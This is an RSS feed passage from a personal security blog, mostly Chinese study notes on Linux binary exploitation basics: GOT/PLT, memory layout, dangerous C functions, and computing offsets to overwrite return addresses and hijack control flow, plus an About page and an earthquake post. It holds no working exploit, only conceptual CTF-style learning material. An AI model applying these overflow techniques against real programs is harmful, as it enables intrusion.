&lt;p&gt;9.read函数（），从打开的设备或者文件中读取数据。ssize_t read(int fd, void *buf, size_t count);count是请求读取的字节数，读取的数据保存在缓冲区buf中，同时文件的当前读写位置后移。返回值是成功读取的字节数；write函数，三个参数分别为(int fd，const void *buf，size_t nbyte)分别为文件描述符，指定的缓冲区（指向一段内存单元的指针）和要写入文件的字节数。&lt;/p&gt;
&lt;p&gt;10.GOT定位：对于模块外部引用的全局变量和全局函数，用 GOT 表的表项内容作为地址来间接寻址；对于本模块内的静态变量和静态函数，用 GOT 表的首地址作为一个基准，用相对于该基准的偏移量来引用，因为不论程序被加载到何种地址空间，模块内的静态变量和静态函数与 GOT 的距离是固定的，并且在链接阶段就可知晓其距离的大小。这样，PIC 使用 GOT 来引用变量和函数的绝对地址，把位置独立的引用重定向到绝对位置。
PLT表：过程链接表用于把位置独立的函数调用重定向到绝对位置。通过 PLT 动态链接的程序支持惰性绑定模式。每个动态链接的程序和共享库都有一个 PLT，PLT 表的每一项都是一小段代码，对应于本运行模块要引用的一个全局函数。程序对某个函数的访问都被调整为对 PLT 入口的访问。&lt;/p&gt;
&lt;p&gt;11.内存四区，一个由c/C++编译的程序占用的内存分为以下几个部分：
1.&lt;strong&gt;栈区（stack）&lt;/strong&gt;：由编译器自动分配释放 ，存放函数的参数值，局部变量的值等。其操作方式类似于数据结构中的栈。2.&lt;strong&gt;堆区（heap)&lt;/strong&gt;： 一般由程序员分配释放， 若程序员不释放，程序结束时可能由OS回   收 。注意它与数据结构中的堆是两回事，分配方式倒是类似于链表。3.&lt;strong&gt;数据区&lt;/strong&gt;：主要包括静态全局区和常量区。如果要站在汇编角度细分的话还可以分为很多小的区。全局区（静态区）（static）：全局变量和静态变量的存储是放在一块的，初始化的全局变量和静态变量在一块区域， 未初始化的全局变量和未初始化的静态变量在相邻的另一块区域，程序结束后由系统释放。常量区 ：常量字符串就是放在这里的。 程序结束后由系统释放4.&lt;strong&gt;代码区&lt;/strong&gt;：存放函数体的二进制代码。&lt;/p&gt;
&lt;p&gt;12.需要注意的是，由于在计算机内存中，每个值都是按照字节存储的。一般情况下都是采用小端存储，即 0x0804843B 在内存中的形式是&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;\x3b\x84\x04\x08
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;但是，我们又不能直接在终端将这些字符给输入进去，在终端输入的时候 \，x 等也算一个单独的字符。。所以我们需要想办法将 \x3b 作为一个字符输入进去。那么此时我们就需要使用一波 pwntools 了。&lt;/p&gt;
&lt;p&gt;13.常见的危险函数如下&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;输入
&lt;ul&gt;
&lt;li&gt;gets，直接读取一行，忽略&amp;rsquo;\x00&#39;&lt;/li&gt;
&lt;li&gt;scanf&lt;/li&gt;
&lt;li&gt;vscanf&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;输出
&lt;ul&gt;
&lt;li&gt;sprintf&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;字符串
&lt;ul&gt;
&lt;li&gt;strcpy，字符串复制，遇到&amp;rsquo;\x00&amp;rsquo;停止&lt;/li&gt;
&lt;li&gt;strcat，字符串拼接，遇到&amp;rsquo;\x00&amp;rsquo;停止&lt;/li&gt;
&lt;li&gt;bcopy&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;计算&lt;strong&gt;我们所要操作的地址与我们所要覆盖的地址的距离&lt;/strong&gt;。常见的操作方法就是打开 IDA，根据其给定的地址计算偏移。一般变量会有以下几种索引模式&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;相对于栈基地址的的索引，可以直接通过查看 EBP 相对偏移获得&lt;/li&gt;
&lt;li&gt;相对应栈顶指针的索引，一般需要进行调试，之后还是会转换到第一种类型。&lt;/li&gt;
&lt;li&gt;直接地址索引，就相当于直接给定了地址。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;一般来说，我们会有如下的覆盖需求&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;覆盖函数返回地址&lt;/strong&gt;，这时候就是直接看 EBP 即可。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;覆盖栈上某个变量的内容&lt;/strong&gt;，这时候就需要更加精细的计算了。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;覆盖 bss 段某个变量的内容&lt;/strong&gt;。&lt;/li&gt;
&lt;li&gt;根据现实执行情况，覆盖特定的变量或地址的内容。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;之所以我们想要覆盖某个地址，是因为我们想通过覆盖地址的方法来&lt;strong&gt;直接或者间接地控制程序执行流程&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;0X06&amp;ndash;尚存在的问题:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.关于ret2shellcode是如何执行的。RWX,bss段具有可执行权限，即NX开没开有什么意义，看不到区别。&lt;/p&gt;
&lt;p&gt;2.ESP的调试为什么断点下在CALL处。&lt;/p&gt;
&lt;p&gt;3.buf两端的问题。&lt;/p&gt;
&lt;p&gt;4.关于shellcode的位置问题：正常情况下都是使用gds调试程序，然后查看内存来确定shellcode的为之。但实际上执行exp的时候会发现shellcode不在这个位置上，因为gdb的调试环境会影响buf在内存中的位置。关闭ALSR只能保证buf的地址在gdb的调试环境中不变，但是直接执行elf时，buf的位置会固定在别的地址上。
解决此问题最简单的方法就是开启core dump功能，即：
ulimit -c unlimited
sudo sh -c ‘echo “/tmp/core.%t” &amp;gt; /proc/sys/kernel/core_pattern’
开启之后，当出现内存错误的时候，系统会生成一个core dump文件在tmp目录下。然后我们再用gdb查看这个core文件就可以获取到buf真正的地址了。&lt;/p&gt;
&lt;p&gt;CTF-Wiki&amp;gt;Linux Pwn:&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/stackoverflow-basic-zh/&#34;&gt;Stack Overflow principle&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic-rop-zh/&#34;&gt;Basic ROP&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8&#34;&gt;系统调用&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/niklasb/libc-database&#34;&gt;Github上Libc版本库&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/lieanu/LibcSearcher&#34;&gt;LibcSearcher工具&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.anquanke.com/post/id/85831&#34;&gt;现代栈溢出利用技术基础：ROP&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://drops.xmd5.com/static/drops/tips-6597.html&#34;&gt;一步一步学ROP之linux_x86篇&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://segmentfault.com/a/1190000007406442&#34;&gt;一步一步学ROP之linux_x64篇&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://paper.seebug.org/271/&#34;&gt;手把手教你栈溢出从入门到放弃（上）&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://paper.seebug.org/272/&#34;&gt;手把手教你栈溢出从入门到放弃（下）&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://paper.seebug.org/481/&#34;&gt;Linux下pwn从入门到放弃&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>About</title>
      <link>https://wander1ng.com/about/</link>
      <pubDate>Wed, 19 Jun 2019 22:02:31 +0800</pubDate>
      
      <guid>https://wander1ng.com/about/</guid>
      <description>&lt;p&gt;Cybersecurity Researcher(Focusing on Advanced Persistent Threat)&lt;/p&gt;
&lt;p&gt;Interest: Reading | Photography  | Travel | Wander | Cooking&lt;/p&gt;
&lt;p&gt;WeChat ID: WanderingtotheMoon (どうぞよろしくお願いいたします)&lt;/p&gt;
&lt;p&gt;微信公众号：清夜无尘的一方天地 (欢迎关注~)&lt;/p&gt;
&lt;p&gt;[不要温和地走进那个良夜]——Dylan Thomas&lt;/p&gt;
&lt;p&gt;[我与我周旋久 宁作我]——《世说新语》&lt;/p&gt;
&lt;p&gt;[去爱去生活去受伤]——《我的阿勒泰》&lt;/p&gt;
&lt;p&gt;[A rolling stone gathers no moss]——Publiius Syrus&lt;/p&gt;
&lt;p&gt;[湖中焉得更有此人！]——张岱&lt;/p&gt;
&lt;p&gt;[身体为了繁衍留下后代，精神为了繁衍留下文字。]——我自己&lt;/p&gt;
&lt;p&gt;[阅读只是在被动接受，你读过什么并不代表你是什么。书写才能定义自我，你所写下的就是你自己。]——我自己&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Gensis</title>
      <link>https://wander1ng.com/post/gensis/</link>
      <pubDate>Wed, 19 Jun 2019 02:56:00 +0800</pubDate>
      
      <guid>https://wander1ng.com/post/gensis/</guid>
      <description>&lt;p&gt;Earthquake and Blog&lt;/p&gt;
&lt;p&gt;第一次建博客的那天晚上，人在学校宿舍，遭遇了人生第一次感到恐慌的地震，震级为6.0级，以至于之后的半年常常在半夜惊醒。&lt;/p&gt;
&lt;p&gt;地震这事，大概就和吃云南野生菌中毒一样，没有必要执着于去经历一次，可是经历过一次真的永生难忘&amp;hellip;&lt;/p&gt;
&lt;p&gt;又想到《西游记》中齐天大圣也是从一块灵石降世，这地震大抵也是我的博客第一声“Hello World&amp;quot;引发的天地异象~&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>